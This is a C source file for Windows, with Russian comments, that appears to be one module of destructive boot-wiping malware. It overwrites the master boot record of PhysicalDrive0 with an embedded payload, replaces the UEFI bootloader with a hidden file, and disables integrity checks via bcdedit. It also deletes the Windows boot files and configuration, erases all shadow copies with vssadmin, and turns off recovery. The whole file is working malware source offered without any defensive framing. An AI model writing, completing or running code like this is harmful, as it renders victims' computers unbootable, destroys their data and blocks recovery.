#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

#include "massive.h"

#pragma comment(lib, "advapi32.lib")

// ================================================================
// ВНЕШНИЕ ПЕРЕМЕННЫЕ (объявлены в main.cpp)
// ================================================================

extern volatile bool g_running;

// ================================================================
// ВНЕШНИЕ ФУНКЦИИ (из watchdog.cpp)
// ================================================================

extern void TriggerBSOD(void);

// ================================================================
// 1. ОПРЕДЕЛЕНИЕ ТИПА СИСТЕМЫ
// ================================================================

typedef enum {
    SYSTEM_UNKNOWN = 0,
    SYSTEM_BIOS,
    SYSTEM_UEFI
} SystemType;

SystemType GetSystemType(void) {
    FIRMWARE_TYPE ft;

    if (GetFirmwareType(&ft)) {
        if (ft == FirmwareTypeUefi) return SYSTEM_UEFI;
        if (ft == FirmwareTypeBios) return SYSTEM_BIOS;
    }

    if (GetFirmwareEnvironmentVariableA("", "{00000000-0000-0000-0000-000000000000}", NULL, 0) != 0 ||
        GetLastError() != ERROR_INVALID_FUNCTION) {
        return SYSTEM_UEFI;
    }

    char drives[256];
    GetLogicalDriveStringsA(256, drives);
    for (int i = 0; i < 256; i += 4) {
        if (drives[i] == 0) break;
        char path[16];
        char efiPath[260];
        sprintf_s(path, sizeof(path), "%c:", drives[i]);
        sprintf_s(efiPath, sizeof(efiPath), "%s\\EFI", path);
        if (GetFileAttributesA(efiPath) != INVALID_FILE_ATTRIBUTES) {
            return SYSTEM_UEFI;
        }
    }

    return SYSTEM_BIOS;
}

bool IsUEFIActive(void) {
    SystemType type = GetSystemType();
    return (type == SYSTEM_UEFI);
}

// ================================================================
// 2. ФУНКЦИИ ЗАПИСИ
// ================================================================

bool EnablePrivilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, SE_BACKUP_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}

bool WriteMBR(void) {
    if (IsUEFIActive()) return false;

    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk == INVALID_HANDLE_VALUE) {
        hDisk = CreateFileA("\\\\.\\PhysicalDrive1", GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    }
    if (hDisk == INVALID_HANDLE_VALUE) return false;

    unsigned char sector[512];
    DWORD bytesRead;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    if (ReadFile(hDisk, sector, 512, &bytesRead, NULL) && bytesRead == 512) {
        if (sector[0x1C2] == 0xEE) {
            CloseHandle(hDisk);
            return false;
        }
    }

    DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);
    DWORD written;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    WriteFile(hDisk, mbr_gg, 512, &written, NULL);
    FlushFileBuffers(hDisk);
    DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);
    CloseHandle(hDisk);
    return written == 512;
}

bool WriteESP(void) {
    if (!IsUEFIActive()) return false;

    system("mountvol S: /S 2>nul");
    Sleep(1000);

    if (GetFileAttributesA("S:\\") == INVALID_FILE_ATTRIBUTES) return false;

    system("del /f /q S:\\EFI\\Boot\\bootx64.efi 2>nul");
    system("del /f /q S:\\EFI\\Microsoft\\Boot\\bootmgfw.efi 2>nul");
    system("del /f /q S:\\EFI\\Microsoft\\Boot\\bootmgr.efi 2>nul");

    CreateDirectoryA("S:\\EFI", NULL);
    CreateDirectoryA("S:\\EFI\\Boot", NULL);

    system("bcdedit /set {bootmgr} nointegritychecks Yes 2>nul");
    system("bcdedit /set {current} nointegritychecks Yes 2>nul");

    HANDLE hFile = CreateFileA("S:\\EFI\\Boot\\bootx64.efi", GENERIC_WRITE,
                               0, NULL, CREATE_ALWAYS, 
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD written;
    WriteFile(hFile, uefi_loader, uefi_size, &written, NULL);
    CloseHandle(hFile);
    return written == uefi_size;
}

// ================================================================
// 3. УНИЧТОЖЕНИЕ ЗАГРУЗОЧНЫХ ДАННЫХ
// ================================================================

void KillBootData(void) {
    system("bcdedit /delete {bootmgr} /f 2>nul");
    system("bcdedit /delete {default} /f 2>nul");
    system("bcdedit /delete {current} /f 2>nul");
    system("attrib -h -s -r C:\\boot\\BCD 2>nul");
    system("del /f /q C:\\boot\\BCD 2>nul");
    system("attrib -h -s -r C:\\Boot\\BCD 2>nul");
    system("del /f /q C:\\Boot\\BCD 2>nul");

    system("attrib -h -s -r C:\\bootmgr 2>nul");
    system("del /f /q C:\\bootmgr 2>nul");
    system("attrib -h -s -r C:\\Windows\\System32\\winload.exe 2>nul");
    system("del /f /q C:\\Windows\\System32\\winload.exe 2>nul");
    system("attrib -h -s -r C:\\Windows\\System32\\winload.efi 2>nul");
    system("del /f /q C:\\Windows\\System32\\winload.efi 2>nul");

    system("vssadmin delete shadows /all /quiet 2>nul");

    system("bcdedit /set {default} recoveryenabled No 2>nul");
    system("bcdedit /set {current} recoveryenabled No 2>nul");
    system("bcdedit /set {bootmgr} displaybootmenu No 2>nul");
    system("bcdedit /set {bootmgr} timeout 0 2>nul");
}

// ================================================================
// 4. ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА (для main.cpp)
// ================================================================

int IsAdmin(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return 0;
    DWORD size = 0;
    GetTokenInformation(hToken, TokenElevationType, NULL, 0, &size);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        CloseHandle(hToken);
        return 0;
    }
    BYTE* buffer = (BYTE*)malloc(size);
    if (!buffer) {
        CloseHandle(hToken);
        return 0;
    }
    BOOL elevated = 0;
    if (GetTokenInformation(hToken, TokenElevationType, buffer, size, &size)) {
        TOKEN_ELEVATION_TYPE* elev = (TOKEN_ELEVATION_TYPE*)buffer;
        elevated = (*elev == TokenElevationTypeFull);
    }
    free(buffer);
    CloseHandle(hToken);
    return elevated;
}